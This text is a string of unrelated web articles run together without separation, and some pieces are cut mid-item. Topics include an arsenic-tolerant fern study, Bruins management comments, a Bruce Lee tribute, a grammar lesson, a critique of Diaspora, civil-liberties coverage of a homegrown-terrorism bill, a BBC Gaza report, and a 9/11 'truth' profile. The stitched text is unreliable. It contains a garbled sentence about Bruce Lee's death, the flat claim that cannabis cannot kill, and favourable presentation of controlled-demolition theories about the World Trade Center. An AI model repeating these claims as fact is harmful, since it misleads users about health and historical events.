This could mean more people will do porn for the sheer love of it — but it could also mean young people hoping for mainstream fame will be exploited for little money or none at all .
Whatever the case , porn performers may need support now more than ever — and porn consumers would do well to recognize that they 're jacking off to human beings .

When Arousal Is A Sin : The Problems Of Christian Sex " Therapy "
Isolating a gene that allows a type of fern to tolerate high levels of arsenic , Purdue University researchers hope to use the finding to create plants that can clean up soils and waters contaminated by the toxic metal .
The fern Pteris vittata can tolerate 100 to 1,000 times more arsenic than other plants .
Jody Banks , a professor of botany and plant pathology , and David Salt , a professor of horticulture , uncovered what may have been an evolutionary genetic event that creates an arsenic pump of sorts in the fern .
" It actually sucks the arsenic out of the soil and puts it in the fronds , " Banks said .
" It 's the only multi- cellular organism that can do this . "
Without a genome sequenced for Pteris vittata , Banks and Salt used a method of gene identification called yeast functional complementation .
They combined thousands of different Pteris vittata genes into thousands of yeast cells that were missing a gene that makes them tolerant to arsenic .
The yeast was exposed to arsenic , with most of it dying .
The yeast strains that lived had picked up the genes from Pteris vittata that convey arsenic resistance .
To confirm that this was the correct gene , its function was knocked down and the plant was exposed to arsenic .
Without the gene functioning properly , the plant could not tolerate arsenic .

" It tells us that this gene is necessary for the plant to function on arsenic , " said Banks , whose findings were published in the early online version of the journal Plant Cell .
" We looked for a similar gene in the plant Arabidopsis .
We could n't find it .
It ca n't be found in any flowering plant . "
Banks and Salt found that the protein encoded by this gene ends up in the membrane of the plant cell 's vacuole .
Salt said the protein acts as a pump , moving arsenic into the cell 's equivalent of a trashcan .
" It stores it away from the cytoplasm so that it can't have an effect on the plant , " Salt said .
Banks said understanding how the Pteris vittata functions with arsenic could lead to ways to clean up arsenic - contaminated land .
" Potentially you could take these genes and put them in any organism that could suck the arsenic out of the soil , " Banks said .
advertisement
Salt said rice plants could be modified with the gene to store arsenic in the roots of plants -- instead of rice grains -- in contaminated paddies .
Banks and Salt found another gene in Pteris vittata that looks almost exactly the same as the one that controls arsenic tolerance .
When the fern was exposed to arsenic , the confirmed arsenic - tolerance gene increased its expression while the similar gene did not .
Salt said the gene that regulates arsenic tolerance could be a duplicate of the other that has changed slightly to give itself a new function .
" The fact that it has these two genes could be a sign of evolution , " Salt said .
" One of the thoughts of gene evolution is that one copy could continue to do what it has always done , while the duplicate can develop another function . "
The plant might have evolved to accumulate arsenic , Banks and Salt theorized , as a defense against animals or insects eating them .
Banks hopes findings such as this will lead to more research emphasis on non-flowering plants .
She said there are characteristics in plants such as Pteris vittata that cannot be found in other organisms .
The next step in their research is to put the arsenic - tolerance gene from Pteris vittata into Arabidopsis to see whether it gives the new plant the same characteristics .
The National Science Foundation funded the research .

Chiarelli will be busy this summer .
Seguin & Hall
Let 's face it .
There 's nothing that Boston Bruins GM Peter Chiarelli could say on Tuesday that was going assuage the anguish felt by hockey fans in the Hub .
Short of turning back time , the GM was powerless to do anything about the B's excruciating exit .
So , instead , the B's boardroom boss pointed his virtual time machine to the future .
" We will look to make some changes , " he said when he spoke to the press on Tuesday .
" As far as committed contracts and entry into the unrestricted free agent market , [ the Bruins are ] probably not going to be too heavy on entering the unrestricted free agent market .
" But there are other ways to facilitate change and you look to either the trade market or to talent from within and whether that ’s prospects , post - draft players or whatnot . "
" Change is a far - reaching word , " continued Chiarelli .
" It applies generally to the personnel . " [ We 'll ] dissect that series , and we look at deficiencies in our game and you address them as you look forward .
I do n’t just address that series and fix the team based on that series .
I look at the whole thing .
I look at the short - term , the middle - term , and the long - term .
" Thanks to the resulting draft picks ( 2010 first and second round , and 2011 first round ) , the B's trade of Phil Kessel might generate the biggest change over the lengths of all of those varying lengths of time .
" We are going to get a really good player and it is going to be one of those two forwards , " said Chiarelli of NHL Central Scouting 's top prospects -- Tyler Seguin and Taylor Hall .
" As far as the immediate impact , it depends how you define impact , " explained the GM .
" I do n’t want to put any pressure on any of these guys .
They have to make the team too .
I think you have seen , history has shown , that these players generally take half a year or a year to really get going but both Seguin and Hall are both really good players .
" I am excited about that .
That is a feel good story so maybe [ the hockey media ] can write about that too .
" Previous Bruins draft picks and prospects are expected to press for major league playing time as well .
Zach Hamill ( Boston 's first pick , eighth overall in the 2007 NHL Entry Draft ) and Joe Colborne ( Boston 's first pick , 16th overall in the 2008 NHL Entry Draft ) were the two players mentioned by the media during Tuesday 's season - ending press conference .
" Obviously , we ca n’t commit to anything with those young players as far as being on the roster but ... part of the plan is to inject this youth each year and to grow the organization and grow your team , so they are going to have a shot , is what I can tell you , " said Chiarelli .
" Zach [ Hamill ] improved greatly in the latter half of the year and he is still very young and I thought he acquitted himself well in the game that he played [ vs.
Washington on 4/11 ] .
" Joe [ Colborne ] ... had a tremendous collegiate year .
I know he started strong down there , he had a rough last game but he made some terrific plays and he is still growing .
" Chiarelli was asked if a complacency had worked its way into the organization .
" I do n’t know if complacency is the right word but there is n’t that extra ‘ oomph . ’
Whatever you want to call it -- it is n’t there , " said Chiarelli of the B's historic loss .
" It has only happened two or three times in history so there is obviously something there or there was obviously something missing .
" What can I do to eradicate it ?
I think we are going to learn from it .
I think you saw that push at the end of the regular season .
With the up and down year we had in the regular season , I think the guys came together so I think you saw that and we learned from last year and the year before what it takes to get in despite ... what happened the first part of the season .
" As far as going forward , that is player personnel that I will look at and there is instilling an attitude from me , through Claude [ Julien ] and to the rest of the group , " added the GM .
" I am here all summer .
Claude is here all summer .
I have to live with it .
" And I talked to half the players this morning and these guys are shaking their heads so you have to learn from it .
They are professionals and they will move on , but there is an issue there .
I do n’t know if there is one answer ... [ but ] we will figure it out . "
Every decent man is ashamed of the government he lives under .

Bruce Lee is famous for his amazing martial arts skills , rock - hard body and insane workout regiments .
Before I delve into what other feats he should be known for , watch these videos .
He just ca n’t be human :
Yes , he is using nun chucks , not a paddle .
2 Finger Push - Ups ???
Sidenote :
In that last video where Lee punches his partner Bob Baker from 1 inch away , Bob reportedly said , “ I told Bruce not to do this type of demonstration again .
When he punched me that last time , I had to stay home from work because the pain in my chest was unbearable . ”
According to Wikipedia , Lee ’s other physical feats included :
* Lee ’s striking speed from three feet with his hands down by his side reached five hundredths of a second . [ 61 ]
* Lee ’s combat movements were at times too fast to be captured on film at 24 frames per second , so many scenes were shot in 32 frame per second to put Lee in slow motion
* In a speed demonstration , Lee could snatch a dime off a person ’s open palm before they could close it , and leave a penny behind
* Lee would hold an elevated v-sit position for 30 minutes or longer
* Lee could throw grains of rice up into the air and then catch them in mid-flight using chopsticks
* Lee could thrust his fingers through unopened cans of Coca - Cola .
( This was when soft drinks cans were made of steel much thicker than today ’s aluminum cans )
* Lee performed 50 reps of one - arm chin-ups
* Lee could break wooden boards 6 inches ( 15 cm ) thick
* Lee could cause a 300 - lb ( 136 kg ) bag to fly towards and thump the ceiling with a sidekick .
* Lee performed a sidekick while training with James Coburn and broke a 150 - lb ( 68 kg ) punching bag
* In a move that has been dubbed “ Dragon Flag ” , Lee could perform leg lifts with only his shoulder blades resting on the edge of a bench and suspend his legs and torso perfectly horizontal midair .
Lee also created his own martial arts style called Jeet Kuno Do ( JKD ) , which translates to “ Way of the Intercepting Fist . ”
However , JKD cannot truly be called a style because Lee defined it as having no style .
The goal was to be adaptive to the situation instead of relying on specific rules and moves like most classical martial arts .
He wanted JKD to be “ simple , direct and non-classical .
It is the direct expression of one ’s feelings with the minimum of movements and energy . ”
A great example of this is Lee ’s famous 1 - inch punch which utilized almost no movement but still delivered tremendous force to the victim .
Water was actually the specific metaphor Lee used to describe JKD because it so fluid , adaptive and powerful .
Water can erode the largest of rocks and takes on the shape of whatever container it is put into .
Likewise , a true JKD master should be able to change his fighting style to fit each environment and opponent .
JKD taught that one should conserve as much energy as possible by countering attacks with attacks instead of defensive maneuvers .
More specifically , one should parry attacks while punching simultaneously .
The advantage of parrying over blocking is that it uses less energy because it uses the opponent ’s energy against them and puts them off balance , leaving room for a subsequent attack in their moment of weakness .
Lee also taught that kicks should only be delivered to the middle and lower parts of the body as high kicks simply wasted energy and put the fighter at more risk .
Bruce Lee ’s epic run as the martial arts king of the world sadly ended in 1973 when he was just 32 years - old .
Upon having a intense headache , he took a pain - killer called Equagesic which contained both aspirin and a muscle relaxer .
Lee was found later that night unconscious and was pronounced dead at the hospital an hour or so later .
The autopsy concluded that he had an adverse reaction to the muscle relaxer , causing his brain to a deadly size .
The autopsy also showed that there were trace amounts of cannabis in his system , which the doctor originally tried to blame for the death .
However , upon further investigation , the ignorant doctor was shown to be incorrect as cannabis cannot realistically kill anyone .
So Bruce Lee. Wonder of the martial arts world .
Trainer of 3 United States Karate Champions .
Paradigm of physical fitness and health .
Marijuana Smoker .
Fancy that ..
Allen Kruse had been a charter fishing boat captain for more than two decades - long enough that people called him by his boat 's name , Rookie , as if they were one and the same .
But two months ago , the leaking BP oil well began pouring crude into the Gulf of Mexico waters where he took families fishing for snapper and amberjack .
Two weeks and two days ago , with his fishing grounds closed , Kruse , 55 , took a job working for BP 's cleanup crew in Gulf Shores , Ala .
Other boat captains said Kruse , like them , found the effort confusing , bureaucratic and frustrating .
He told them not to worry about the hassles .
But those close to him saw he was losing weight .
Lie and lay are two words that seem to cause some of the greatest confusion , even among those versed in English grammar .
Lie means to recline ; lay , on the other hand , means to put or place something .
Lay is a transitive verb , meaning that there is always an object after it .
( Lay the book on the shelf .
Book is the object . )
The principal parts of lie and lay are listed below .
lie : lie , lying , lay , ( have ) lain
lay : lay , laying , laid , ( have ) laid
The confusion generally seems to occur with the forms of lie .
The following sentences illustrate the correct and incorrect uses of lay and lie .
lie / lay I lie [ not lay ] on the floor when I watch television .
I lay my keys on the table when I arrive home from work .
lying / laying I am lying [ not laying ] on the floor watching television .
I am laying my briefcase on my desk to remind me that I have work to finish .
lay / laid Yesterday I lay [ not laid ] in bed all day with a fever .
Yesterday I laid my briefcase on my desk and forgot about it when I left for work .
( have ) lain / ( have ) laid I have lain [ not have laid ] in bed all day with a fever .
I have laid my briefcase on my desk to remind me that I have work to finish .
Although these are two extremely confusing verbs , with a little practice , you should have them down pat .
Unfortunately , I do n’t know of any helpful hints to use for remembering how to use lie and lay correctly .
My only suggestion is to memorize them and practice .
Diaspora , the “ open Facebook alternative ” ( NYT story for background if you are n’t familiar ) , has raised Over $ 170,000 from over 4600 people in just a few weeks .
All for an idea .
That ’s an impressive start if victory was measured in press coverage , cash , and cool .
Here ’s the problem : Diaspora has all the wrong things at the wrong time .
Competition that kills is n’t pre-announced — it catches an unsuspecting incumbent by surprise .
They have too much money
They ’re at $ 170,000 today ( Sunday , May 16 , 2010 ) .
They ’ll likely continue to pile up the donations until their Kickstarter campaign ends 16 days from now .
All this money without an actual product is a liability .
Money gives them too much time and too much comfort to take on a fast moving incumbent like Facebook .
Their cash to code ratio is out of whack .
A good enough first version will take longer to produce with $ 170 K than it would have with $ 0 K .
The spotlight is on too early
You want attention after you ’re good , not before .
Obscurity is your friend when you ’re just starting — especially when you do n’t even have a product yet .
You do n’t need the pressure of outside opinion or the press breathing down your neck before you have anything to show .
Millions of eyes — including your competition — watching you every step of the way does n’t help .
All this attention is a distraction .
Ship , then seek the spotlight .
Expectations are too high
Some people are really pissed at Facebook right now .
Those people are looking for a way to channel this negative energy into a movement .
Along comes Diaspora .
Diaspora becomes their horse in the race .
They want that horse to win .
They believe it can win .
Their unlimited hopes and dreams of the anti-Facebook are transferred to Diaspora .
Diaspora becomes everything and anything to anyone who wants to believe .
How can anyone deliver on boundless expectations ?
Diaspora can’t match the fantasy of Diaspora .
I love the underdog , but I fear for the product - less underdog that has all the wrong things at the wrong time .
I think they would have been better off releasing something first .
Let people play with it .
Let people see that it ’s possible .
Then drum up press and public support .
Until there ’s something real to use , fantasy will just get in the way .
In a startling affront to American freedoms of expression , privacy , and association , the Violent Radicalization and Homegrown Terrorism Prevention Act ( H.R. 1955 ) passed the House on October 23 , 2007 , by a vote of 404–6 .
The Senate is currently considering a companion bill , S. 1959 .
The act would establish a national commission and a university - based “ Center for Excellence ” to study and propose legislation to prevent the threat of “ radicalization ” of Americans .
Author of the bill Jane Harman ( D - CA ) explains , “ We ’re studying the phenomenon of people with radical beliefs who turn into people who would use violence . ”
The act states , “ While the United States must continue its vigilant efforts to combat international terrorism , it must also strengthen efforts to combat the threat posed by homegrown terrorists based and operating within the United States .
Understanding the motivational factors that lead to violent radicalization , homegrown terrorism , and ideologically based violence is a vital step toward eradicating these threats in the United States . ”
The act ’s purpose goes beyond academic inquiry , however .
In a press release Harman stated , “ The National Commission will propose to both Congress and [ Department of Homeland Security Secretary Michael ]
Chertoff initiatives to intercede before radicalized individuals turn violent . ”
The act states , “ Preventing the potential rise of self radicalized , unaffiliated terrorists domestically cannot be easily accomplished solely through traditional Federal intelligence or law enforcement efforts , and can benefit from the incorporation of State and local efforts . ”
Harman , who chairs the House Subcommittee on Intelligence , Information Sharing , and Terrorism Risk Assessment , also has close ties to the RAND Corporation [ 1 ] , a right - wing think tank , which appears to have influenced the bill .
Two weeks prior to the introduction of H.R. 1955 on April 19 , 2007 , Brian Michael Jenkins of RAND delivered testimony on “ Jihadist Radicalization and Recruitment ” to Harman ’s subcommittee .
In June , Jenkins was back before Harman ’s subcommittee discussing the role of the National Commission .
“ Homegrown terrorism is the principal threat that we face as a country and it will likely be the principal threat that we face for decades .
. . .
Unless a way of intervening in the radicalization process can be found , we are condemned to stepping on cockroaches one at a time , ” he stated .
In a 2005 RAND report titled “ Trends in Terrorism , ” one chapter is devoted entirely to a non-Muslim “ homegrown terrorist ” threat — the threat of anti-globalists .
In an effort to prevent people from becoming “ prone to ” radicalization , this preemptive measure of policing thought specifically identifies the Internet as a tool of radicalization : “ The Internet has aided in facilitating violent radicalization , ideologically based violence , and the homegrown terrorism process in the United States by providing access to broad and constant streams of terrorist - related propaganda to United States citizens , ” says Harman .
The legislation authorizes a ten- member National Commission ( the Senate bill calls for twelve members ) appointed by the President , the Secretary of Homeland Security , congressional leaders , and the chairpersons of both the Senate and House committees on Homeland Security and Governmental Affairs .
After convening , the Commission is to submit reports at six - month intervals for eighteen months to the President and Congress , stating its findings , conclusions , and legislative recommendations “ for immediate and long - term countermeasures . . . to prevent violent radicalization , homegrown terrorism and ideologically based violence . ”
This commission has disturbing similarities to the Counterintelligence Program ( COINTELPRO ) , which was investigated by a US Senate select committee on intelligence activities ( the Church Committee ) , in 1975 .
The Church Committee found that from 1956 to 1971 , “ The Bureau [ FBI ] conducted a sophisticated vigilante operation aimed squarely at preventing the exercise of First Amendment rights of speech and association , on the theory that preventing the growth of dangerous groups and the propagation of dangerous ideas would protect the national security and deter violence . ”
H.R. 1955 would give the DHS secretary power to establish a “ Center of Excellence , ” a university - based research program to “ bring together leading experts and researchers to conduct multidisciplinary research and education for homeland security solutions . ” the DHS currently has eight Centers at academic institutions across the country , strengthening what many see as a growing military - security - academic complex .
Harman , in an October 23 press release , stated that the Center would “ examine the social , criminal , political , psychological and economic roots of domestic terrorism . ”
Hope Marston , regional organizer with the Bill of Rights Defense Committee ( BORDC ) warns against the danger of vaguely defined terms in this legislation , which , open to very broad interpretation , mirrors a historical pattern of sweeping government repression .
Jules Boykoff , author and professor of politics and government at Pacific University , is alarmed by the circular definition , for example , of “ ideologically based violence , ” which itself fails to define the terms “ threat , ” “ force , ” or “ violence . ”
Boykoff commented that the bill used the terms “ extremism ” and “ radicalism ” interchangeably .
“ The word ‘ radical ’ shares the etymological root to the word ‘ radish , ’ which means to get to the root of the problem , ” he says .
“ So , if the government wants to get at the actual root of terrorism , then let ’s really talk about it .
We need to talk about the economic roots , the vast inequalities in wealth between the rich and poor . ”
Caroline Fredrickson , director of the Washington Legislative Office of the American Civil Liberties Union , says of the Act , “ Law enforcement should focus on action , not thought .
We need to worry about the people who are committing crimes rather than those who harbor beliefs that the government may consider to be ‘ extreme . ’ ”
UPDATE BY JESSICA LEE
While civil liberties and religious freedom groups credit independent journalists and grassroots activists with helping to stall the passage of the Violent Radicalization and Homegrown Terrorism Prevention
Act of 2007 , some members of Congress continue to push for Internet censorship and racial profiling as necessary to prevent “ homegrown terrorism . ”
The House of Representatives approved the Violent Radicalization and Homegrown Terrorism Prevention Act in October 2007 by a 404- 6 vote , but widespread opposition forced the Senate to shelve the bill .
As of June 1 , 2008 , no vote was scheduled or expected during the current legislative year .
I became aware of the Act in early November 2007 .
Other than an article by Lindsay Beyerstein , “ Examining the Homegrown Terrorism Prevention Act , ” ( In These Times , November 1 , 2007 ) , no major media outlet had reported on the bill despite the dangers it posed to civil liberties , privacy , and Muslim and Arab communities in the United States .
Nonetheless , I did discover active online discussion about the bill , mainly on blogs and videos posted to YouTube.com .
Isabel Macdonald , communications director for Fairness and Accuracy in Reporting , commented : “ Perhaps due to the symbiotic relationship between corporate media outlets and government officials , the corporate media has shown a consistent aversion to offering critical coverage of the erosion of civil liberties .
The independent media — and specifically The Indypendent — played a critical role in breaking the story of this bill , and , through coverage in blogs and on Democracy Now ! , keeping the story alive . ”
Within a month of The Indypendent article , rallies were held from Maine to California , and numerous civil liberties , religious freedom and American Muslim and Arab organizations issued action alerts encouraging people to contact their congressional representatives in an effort to stop the US Senate companion bill , S. 1959 .
According to civil rights lobbyists , the public outcry forced Senate committee chair Sen. Joseph Lieberman ( I - CT ) to put the bill on the backburner .
However , Lieberman and committee ranking minority leader Sen. Susan Collins ( R - ME ) continue to claim “ homegrown terrorism ” by Islamists is a grave menace , and on May 8 , 2008 , issued their own report , without public backing by other committee members , that warned “ the threat of homegrown terrorism is on the rise , aided by the Internet ’s capacity to spread the core recruitment and training message of violent Islamist terrorist groups . ”
In response , more than thirty civil liberties and religious freedom groups sent a letter to the Senate committee on May 30 , expressing concern that the report could impinge on freedom of expression , unjustly target Muslims , and define the Internet as a “ weapon . ”
A group of organizations representing American Muslim and Arab communities also submitted a letter in response to the report and the Senate hearings charging that they have been largely excluded from the legislative process and that the report relies on a discredited 2007 New York Police Department report that attempts to explain the process of “ violent radicalization ” of Muslim individuals .
Shortly after issuing the report , Lieberman demanded that Google remove YouTube videos produced by “ terrorist organizations such as al - Qaeda . ”
Google responded May 19 by removing eighty videos that the company agreed violated YouTube ’s Community Guidelines , which depict gratuitous violence , advocated violence or used hate speech .
Google , however , refused to meet all of Lieberman ’s demands , which included censoring all videos mentioning or featuring groups listed by the US State Department as foreign terrorist organizations , such as al - Qaeda .
“ Senator Lieberman stated his belief . . . that all videos mentioning or featuring these groups should be removed from YouTube — even legal nonviolent or non-hate speech videos , ” Google said .
“ You Tube encourages free speech and defends everyone ’s right to express unpopular points of view . ”
Chip Berlet , senior analyst at the Boston - based Political Research Associates , said that he believes Lieberman ’s actions are a “ political dirty trick ” with the motive of trying to push the presidential candidates towards accepting a more aggressive stance in the Middle East .
Organizations leading the effort to oppose the legislation include Defending Dissent Foundation , the Bill of Rights Defense Committee , the Center for Constitutional Rights , the American Civil Liberties Union , and the Council on American - Islamic Relations .
UPDATE BY LINDSAY BEYERSTEIN
The Homegrown Terrorism bill has been bogged down in the Senate since last October .
The bill sailed through the House with little public comment but subsequently encountered stiff opposition from across the political spectrum .
Until recently , it appeared that civil liberties groups and Muslim civic organizations had successfully blocked the Senate version of the bill .
The bill seemed destined to die in committee — that is , until Sen .
Joe Lieberman , the chair of the Senate Committee on Homeland Security , signaled his eagerness to revisit the issue by releasing a new report and picking a fight with YouTube .
On May 8 , Chairman Lieberman and ranking member Susan Collins ( R - ME ) released “ Violent Islamist Extremism , The Internet , and the Homegrown Terrorist Threat , ” a bipartisan report based on hearings before the Senate Committee on Homeland Security .
Even before it was released to the public , the report drew fire from a coalition of civil liberties organizations spearheaded by the ACLU .
The coalition outlined its concerns about the report in a May 7 memo to committee members .
“ Our concern is that this focus on the Internet could be a precursor to proposals to censor and regulate speech on the Internet .
Indeed , some policy makers have advocated shutting down objectionable websites , ” the memo said .
Lieberman reinforced those misgivings on May 19 when he wrote to the CEO of Google ( YouTube ’s parent company ) demanding that an unspecified number of Islamic propaganda videos be removed from the popular video - sharing site .
Lieberman alleged in the letter that the clips were the work of a sophisticated Islamic propaganda network discussed in his committee ’s recent report .
He also claimed that these videos violated YouTube ’s community guidelines .
YouTube rules expressly forbid gratuitous violence , hate speech , threats , harassment , and depictions of crimes such as bomb - making .
Hundreds of thousands of videos are uploaded to the site daily .
Rather than prescreening the content , YouTube relies on users to flag material that violates community standards .
Content that breaks the rules is routinely removed .
After reviewing the clips , YouTube refused to remove the bulk of the material flagged by Lieberman ’s staff .
A handful of clips that violated community standards were taken down , but the rest stayed up .
“ Most of the videos , which did not contain violent or hate speech content , were not removed because they do not violate our Community Guidelines , ” read a statement issued by the YouTube Team .
The statement went on to affirm the right of YouTube users to express unpopular points of view .
Lieberman was not satisfied with the response .
“ No matter what their content , videos produced by terrorist organizations like al - Qaeda that are committed to attacking America and killing Americans should not be tolerated .
Google must reconsider its policy , ” Lieberman stated on May 20 .
No vote has been scheduled , but Lieberman ’s fight with Google has pushed the Homegrown Terrorism bill back into the spotlight .
After months of silence , the established media are finally beginning to ask questions about the government ’s increasing enthusiasm for monitoring “ radical ” speech online .
The New York Times sharply criticized Lieberman and the bill in a May 25 editorial .
The op / ed called Lieberman a “ would - be censor ” whose efforts to restrict constitutionally protected speech on YouTube “ contradict fundamental American values . ”
Readers can make their views on the Homegrown Terrorism bill known by contacting their senators and the members of the Senate Committee on Homeland Security .
The two frontrunners in the 2008 presidential race are senators .
Now is a good time for voters to pressure the presidential candidates to take clear positions on the Homegrown Terrorism bill .
Sen. Barack Obama ( D - IL ) sits on the Homeland Security Committee , but did not contribute to the report .
Sen. John McCain ( R - AZ ) is closely allied with Sen. Lieberman , especially on issues pertaining to terrorism .
UPDATE BY MATT RENNER
A controversial plan to study and profile domestic terrorism was scrapped after popular push back , but the spirit of the legislation lives on in Senator Joe Lieberman ’s office .
H.R. 1955 , “ The Violent Radicalization and Homegrown Terrorism Prevention Act of 2007 ” passed the House in October 2007 with almost unanimous support .
The bill immediately came under fire from civil liberties watchdogs because of what many saw as a deliberate targeting of Muslims and Arabs and the possible chilling effect it might have on free speech .
The original bill intended to set up a government commission to investigate the supposed threat of domestically produced terrorists and the ideologies that underpin their radicalization .
The ten - member commission was to be empowered to “ hold hearings and sit and act at such times and places , take such testimony , receive such evidence , and administer such oaths as the Commission considers advisable to carry out its duties . ”
The bill also singled out the Internet as a vehicle for terrorists to spread their ideology with the intention of recruiting and training new terrorists .
After significant public pressure , the bill stalled in the Senate .
However , Senator Joe Lieberman ( D - CT ) , the current chairman of the Senate Homeland Security and Governmental Affairs Committee , embraced the thrust of the legislation and has been working to push forward some of the goals of the original bill , including an attempt to weed out terrorist propaganda from the Internet .
On May 19 , Lieberman sent a letter to Google ’s CEO Eric Schmidt demanding that YouTube ’s parent company Google “ immediately remove content produced by Islamist terrorist organizations from YouTube . ”
“ By taking action to curtail the use of YouTube to disseminate the goals and methods of those who wish to kill innocent civilians , Google will make a singularly important contribution to this important national effort , ” Lieberman wrote .
Google fired back , refusing to take off material that did not violate the site ’s code of conduct .
“ While we respect and understand his views , YouTube encourages free speech and defends everyone ’s right to express unpopular points of view , ” Schmidt said in response , adding , “ we believe that YouTube is a richer and more relevant platform for users precisely because it hosts a diverse range of views , and rather than stifle debate , we allow our users to view all acceptable content and make up their own minds . ”
Google removed some of the videos that violated their rules against posting violence and hate speech , but made a point to write , “ most of the videos , which did not contain violent or hate speech content , were not removed because they do not violate our Community Guidelines . ”
According to civil liberties activists , Chairman Lieberman has been spearheading an effort to censor speech on the Internet .
His committee recently released a report titled “ Violent Islamist Extremism , The Internet , and the Homegrown Terrorist Threat , ” a report detailing the use of web sites and Internet tools to spread pro-terrorism propaganda .
The report repeatedly blames websites and chat rooms for “ radicalization , ” calling the websites “ portals ” through which potential terrorists can “ participate in the global violent Islamist movement and recruit others to their cause . ”
As civil liberties groups have pointed out , the report focuses solely on terrorism seen as associated with Islam .
Caroline Fredrickson , director of the ACLU Washington , DC , legislative office , said that Lieberman “ is trying to decide what he thinks should go on the Internet , ” which , she said , “ reeks of an interest in censoring all sorts of different dialogs . ”
“ If someone criticizes Israel ’s treatment of Palestinians and favors Hamas , should that be censored ? ” Fredrickson asked .

New York Times editorial on Lieberman ’s attempt to censor YouTube
COMMENT BY MICKEY S. HUFF , author of Chapter 14
The coverage of this story by these journalists is highly commendable .
However , another element that appears to have been censored regarding the possible application of H.R. 1955 and S. 1959 , even in the independent and progressive press coverage , is the specificity of possible domestic activists mentioned in the hearings Representative Jane Harman held in Washington , DC .
While the aforementioned authors allude to animal rights activists and anti-globalists as potential targets of these bills , none mention 9/11 Truth activists and scholars even though they were mentioned by name in the Harman hearings at the Capitol .
( For possible explanations , see Censored 2008 , Chapter 7 , for more on the propaganda model inside left progressive press . )
Among the claims of those testifying to Congress about the “ need ” for H.R. 1955 was that anyone who questions the official government line on 9/11 is akin to a terrorist or a material supporter to terrorism .
One speaker , Mark Weitzman of the Wiesenthal Center ( ironically founded by Holocaust survivor Simon Wiesenthal to educate the public about war crimes ) , claimed that architects , engineers , and scientists that question the official 9/11 narrative are the same as alleged violent jihadist groups .
This was further implied in a Powerpoint presentation in which Weitzman showed architect Richard Gage ’s website , http://AE911Truth.org, alongside alleged violent jihadist sites .
Gage has criticized the 9/11 official story about the destruction of the Twin Towers and WTC7 .
On the basis of his professional expertise of steel frame buildings , Gage contends the buildings could not have been brought down the way the government has explained and offers alternative theories supported by evidence .
Regardless of whether one believes the counterarguments about the events of 9/11 , free speech and questioning of the government on such crucial issues should not be criminalized .
This is the latest round of official conflation between terrorists and activists in the US .
Is there a proven link between these aforementioned groups ?
No , there is not .
But that did n’t stop people from simply saying so on the public record while providing no evidence .
And Jane Harman , Democratic cosponsor of the bill , did n’t ask for any , nor did she invite rebuttal .
This is reminiscent of McCarthyism of the Red Scare period of the 1950s .
I originally wrote about this issue here and here .

Mr Obama met with Mr Abbas in the White House US President Barack Obama has said the situation in Gaza is " unsustainable " and promised millions of dollars in new aid for the territory .
He made the remarks as he met Palestinian leader Mahmoud Abbas in Washington .
The White House visit was scheduled before the deadly Israeli raid on a Gaza - bound aid flotilla last week .
Mr Obama urged both Israel and the Palestinians to make concessions and return to stalled peace talks .
" Not only is the status quo with respect to Gaza unsustainable , but the status quo with respect to the Middle East is unsustainable , " Mr Obama said .
" It is time for us to go ahead , move forward on a two - state solution . "
' Proximity talks '
He called on the Israeli government to curb the building of Jewish settlements in the West Bank and asked the Palestinians to prevent any actions that could incite confrontation .
ANALYSIS Tim Franks , BBC Middle East correspondent
" The game has changed , " was how one Western diplomat described it .
Today President Obama became the latest of a long line of major figures to describe the Israeli blockade as " unsustainable " .
The next big moment is likely to come with a meeting of European Union foreign ministers in Brussels on Monday .
There appears to be a concerted feeling , across the EU - and indeed among the Americans and the United Nations - that this is a chance not just to improve the humanitarian situation , but to re-make the shattered economy of Gaza .
That would involve opening the crossings not only to bring more goods in , but to allow Gazan exports out .
There is also talk of trying to persuade Israel to move to a system where it publishes a blacklist of what it refuses to let into Gaza , rather than the current system where it just keeps a private list of what is allowed in .
" Both sides have to create an environment , a climate that will be conducive to an actual breakthrough , " Mr Obama said after the meeting .
He said the US would provide $ 400 m ( £ 274 m ) in new aid for the Palestinians .
Israel says its blockade of Gaza is necessary to deter attacks by militants from the Hamas movement , which runs Gaza .
Mr Abbas , who is president of the Palestinian Authority , arrived in Washington on Tuesday from Turkey , which fiercely condemned the 31 May Gaza flotilla raid that killed nine Turkish activists .
During his visit , Mr Abbas is also due to meet National Security Adviser James Jones and some members of Congress .
Wednesday 's talks come a week after Israeli Prime Minister Benjamin Netanyahu cancelled his own White House trip , in order to deal with the fallout from the Gaza crisis .
Indirect US - mediated talks between the Israelis and the Palestinians resumed in May after a break of nearly two years .
The two sides are negotiating through US envoy George Mitchell , in so - called proximity talks .
The discussions are due to last four months , and are meant to address some core issues : borders , Jerusalem and refugees .

The Connection between 9/11 , Anthrax and Iraq by Dr. Graeme MacQueen in Walkerton , Ontario , Canada on May 1 , 2010 .
Walkerton , Ontario - Saturday , May 1 .
Dr. Graeme MacQueen 's speech about 9/11 , Anthrax and the Iraqi connection
Graeme MacQueen , PhD Associate Professor of Religious Studies and founding Director , Centre for Peace Studies , McMaster University ( ret ) .
* Interview 11/19/06 : " ... theres no way those 3 towers were brought down by planes , jet fuel and fire .
One tower , maybe .
A structural flaw in the tower , a set of coincidences .
Two towers — were getting into a highly unlikely situation , even though their construction was similar , because the planes hit in different ways .
Three towers ( including WTC 7 now , which was n't hit by a plane ) , the odds against this are astronomical . "
* Essay 8/21/06 : Regarding the recorded oral accounts of 503 members of the Fire Department of New York taken by the Department shortly after 9/11 .
" Claims that explosions contributed to the collapses were made on 9/11 and have persisted , but studies supportive of the U.S. governments account of events have ignored or denied these claims .
...
We begin by facing the simple number of individual witnesses ( 118 ) and the even greater number of references , direct or indirect , in their accounts to explosions .
We next have to deal with the rich , mutually supportive detail of these accounts .
... I cannot read this material without being struck by the ways in which the witnesses testimony is not merely cumulative but complementary and multidimensional .
...
It appears ( references are somewhat unclear ) that the Commission did , in fact , make fairly extensive use of the oral histories .
...
But what about all the references in the FDNY material to explosions ?
The Report makes no mention of them . "

* Member : Scholars for 9/11 Truth and Justice Association Statement : " Scholars for 9/11 Truth and Justice is a non-partisan organization consisting of independent researchers and activists engaged in uncovering the true nature of the September 11 , 2001 attacks . "
* Member : Religious Leaders for 9/11 Truth Association Statement " When faced with actions that conflict with the universal moral principle that we should not do to others what we would not want done to ourselves or our loved ones , members of faith communities have a responsibility to voice their opposition to those actions .
Many religious leaders throughout history have publicly challenged morally unacceptable practices --- recently , for example , in the civil rights and anti-apartheid movements .
A significant moral challenge has emerged due to glaring discrepancies between the official version of the events of September 11 , 2001 , and the results of extensive independent research by individuals with relevant scientific or professional expertise .
. . .
